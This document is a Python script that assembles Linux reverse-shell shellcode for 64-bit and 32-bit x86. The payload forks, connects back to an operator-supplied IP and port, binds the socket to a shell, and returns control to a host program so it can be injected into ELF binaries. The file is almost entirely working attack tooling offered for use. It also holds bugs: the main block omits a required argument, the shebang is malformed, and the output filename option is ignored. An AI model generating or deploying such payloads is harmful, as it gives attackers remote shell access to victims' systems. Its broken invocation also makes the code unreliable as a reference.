#/usr/bin/python3

import ctypes, struct, binascii, socket, argparse
import netaddr, sys
from keystone import *


def sockaddr(IP, PORT):
    '''Returns the IP, PORT, and AF_INET hex representation
       in network byte order for use in generating shellcode.
       Arguments are IP and PORT.'''

    # pack arguments in to be place in the correct order on the stack 
    ip_bytes    = struct.pack("<I",netaddr.IPAddress(IP).value)
    port_bytes  = struct.pack("<h", PORT)
    inet_family = struct.pack(">h", socket.AF_INET)

    # combine them in the appropriate order for the connect syscall
    combine     = ip_bytes + port_bytes + inet_family

    # return in the appropriate string format for the shellcode
    return "0x" + binascii.hexlify(combine).decode('utf-8')

def x64_reverse_shell(IP,PORT,addr):
    '''x64_reverse_shell(ip(string), port(int), addr(int)) -> bytearray(shellcode)
    
       Generate a 64-bit TCP reverse shell.
       The shellcode will initially call fork and the parent
       process will jmp to the address specified which allows
       graceful handling when injecting into an ELF. The child
       process then calls socket and connect followed by dup2
       in order to duplicate the socket FD to stdin/stdout/stderr.
       Once complete, execve("/bin/sh",0,0) is called.'''

    address = sockaddr(IP, PORT)
    jmp_addr = str(addr)

    #shellcode
    assembly = (
        "    mov rax,    57                      ;"   # fork()
        "    syscall                             ;"
        "    cmp rax,    0                       ;"   # 0==child process
        "    jz  socket                          ;"   # jmp to socket if child
        "    mov rax, " + jmp_addr +            ";" + # mov location to jmp into rax
        "    jmp rax                             ;"
        "socket:                                 ;"
        "    push    byte    41                  ;"   # push/pop will set syscall num for socket
        "    pop rax                             ;"
        "    cdq                                 ;"   # cdq sets rdx to 0 if rax is positive
        "    push    byte    2                   ;"   # AF_INET = 2
        "    pop rdi                             ;"
        "    push    byte    1                   ;"   # SOCK_STREAM = 1
        "    pop rsi                             ;"
        "    syscall                             ;"   # socket(AF_INET, SOCK_STREAM, 0)
	"connect:                                ;"
        "    xchg    rax,    rdi                 ;"   # rdi is 2, so moving only al is doable
        "    mov al, 42                          ;"
        "    mov rcx, " + address +             ";" + # socket address and port
        "    push    rcx                         ;"
        "    mov    rsi,rsp                      ;"
        "    mov     dl, 16                      ;"   # sockaddr length
        "    syscall                             ;"   # connect(s, addr, len(addr)
	"dup2:                                   ;"
        "    push    byte    3                   ;"   # start with 3 and decrement
        "    pop rsi                             ;"
	"dup2_loop:                              ;"
        "    mov al, 33                          ;"   # duplicate socket fd to stdin, stdout, stderr
        "    dec esi                             ;"
        "    syscall                             ;"   # dup2(s, rsi)
        "    jnz dup2_loop                       ;"   # jump when esi != 0
	"execve:                                 ;"
        "    cdq                                 ;"
        "    mov al, 59                          ;"   # execve
        "    push    rdx                         ;"   # put null-byte in /bin/sh
        "    mov rcx,    0x68732f2f6e69622f      ;"   # /bin/sh
        "    push    rcx                         ;"
        "    push    rsp                         ;"   # rsp points to top of the stack where /bin/sh resides
        "    pop rdi                             ;"   # use a push/pop to prevent null-byte and get a shorter shellcode
        "    syscall                             ;"   # execve('/bin/sh',0,0)
    )

    engine = Ks(KS_ARCH_X86, KS_MODE_64)
    shellcode, count = engine.asm(assembly)

    return bytearray(shellcode)
        
def x32_reverse_shell(IP,PORT,addr):
    '''x32_reverse_shell(ip(string), port(int), addr(int)) -> bytearray(shellcode)
    
       Generate a 32-bit TCP reverse shell.
       The shellcode will initially call fork and the parent
       process will jmp to the address specified which allows
       graceful handling when injecting into an ELF. The child
       process then calls socket and connect followed by dup2
       in order to duplicate the socket FD to stdin/stdout/stderr.
       Once complete, execve("/bin/sh",0,0) is called.'''

    ip = "0x" + binascii.hexlify(socket.inet_aton(IP)).decode('utf-8')
    port = "0x" + binascii.hexlify(struct.pack("H",socket.htons(PORT))).decode('utf-8')
    jmp_addr = str(addr)

    #shellcode
    assembly = (
        "    mov    eax,    2                    ;"   # fork()
        "    int    0x80                         ;"
        "    cmp    eax,    0                    ;"   # 0==child process
        "    jz     socket                       ;"   # jmp to socket if child
        "    mov    eax, " + jmp_addr +         ";" + # mov location to jmp into rax
        "    jmp    eax                          ;"
        "socket:                                 ;"
        "    push   0x66                         ;"   # push/pop will set syscall num for socket
        "    pop    eax                          ;"
        "    push   0x1                          ;"   # SYS_SOCKET = 1
        "    pop    ebx                          ;"
        "    xor    edx,edx                      ;"   # type = 0
        "    push   edx                          ;"   # SOCK_STREAM = 1
        "    push   ebx                          ;"
        "    push   0x2                          ;"   # AF_INET = 2
        "    mov    ecx,esp                      ;"   # place the sys_socket arguments into ecx 
        "    int    0x80                         ;"   # socketcall(SYS_SOCKET, (AF_INET, SOCK_STREAM, 0))
	"connect:                                ;"
        "    xchg   edx,eax                      ;"   # move socket into edx
        "    mov    al,0x66                      ;"   # place socketcall back in eax
        "    push   " + ip +                    ";" + # put ip on the stack
        "    push   " + port +                  ";" + # put port on the stack
        "    inc    ebx                          ;"   
        "    push   bx                           ;"   # push 2 onto stack for AF_INET
        "    mov    ecx,esp                      ;"
        "    push   0x10                         ;"   # push addrlen of 16 bytes
        "    push   ecx                          ;"   # push 2 into appropriate location on stack
        "    push   edx                          ;"   # push socket fd onto stack
        "    mov    ecx,esp                      ;"   # move all arguments into ecx
        "    inc    ebx                          ;"   # inc ebx to 3 for connect 
        "    int    0x80                         ;"   # socketcall(SYS_CONNECT, (sockfd, sockaddr, addrlen))
	"dup2:                                   ;"
        "    push   0x2                          ;"   # start with 2 and decrement
        "    pop    ecx                          ;"
        "    xchg   edx,ebx                      ;"   # move socket fd into ebx
	"dup2_loop:                              ;"
        "    mov    al,0x3f                      ;"   # duplicate socket fd to stdin, stdout, stderr
        "    int    0x80                         ;"   # dup2(old_fd, new_fd)
        "    dec    ecx                          ;"   
        "    jns    dup2_loop                    ;"   # jump when ecx !< 0
	"execve:                                 ;"
        "    mov    al,0xb                       ;"   # execve = 11
        "    inc    ecx                          ;"   # inc ecx 0
        "    mov    edx,ecx                      ;"   # mov 0 into edx
        "    push   edx                          ;"   # place null byte terminator on stack
        "    push   0x68732f2f                   ;"   # //sh
        "    push   0x6e69622f                   ;"   # /bin
        "    mov    ebx,esp                      ;"   # mov arguments into ebx
        "    int    0x80                         ;"   # execve('/bin/sh\x00',0,0)
    )

    engine = Ks(KS_ARCH_X86, KS_MODE_32)
    shellcode, count = engine.asm(assembly)
    
    return bytearray(shellcode)

def verify_ip(host):
    if netaddr.valid_ipv4(host):
        return host
    else:
        print("Invalid IPv4 Address provided")
        sys.exit()

def verify_port(port):
    try:
        port = int(port)
        if int(port) > 0 and int(port) < 65535:
            return port
        else:
            print("Provided input was not within port range.")
            sys.exit()
    except:
        print("Invalid input for port.")
        sys.exit()

def verify_arch(arch):
    amd64 = ["64","amd64","x86_64","x86-64"]
    i386  = ["32","x86","i386","x86_32","x86-32"]

    if arch in amd64:
        return 64
    elif arch in i386:
        return 32
    else:
        print("Incompatible arch selected. Please use 32 or 64.")
        sys.exit()

if __name__ == '__main__':

    parser = argparse.ArgumentParser(
            formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("host", metavar="IP", type=verify_ip,
            help="Provide an ipv4 host address for shellcode generation.")
    parser.add_argument("port", metavar="PORT", type=verify_port,
            help="Provide a port for shellcode generation.")
    parser.add_argument("arch", metavar="ARCH", type=verify_arch,
            help="Provide architecture type: 64 or 32")
    parser.add_argument("-f", dest="file", default="generated",
            help="Option to set the output shellcode filename")
    args = parser.parse_args()

    if args.arch == 64:
        shellcode = x64_reverse_shell(args.host,args.port)
    elif args.arch == 32:
        shellcode = x32_reverse_shell(args.host,args.port)
    else:
        print("Wrong options selected. Use -h for usage.")
        sys.exit()

    with open("generated","wb") as f:

        f.write(shellcode)

    print("Shellcode successfully compiled and saved as: {}".format(args.file))
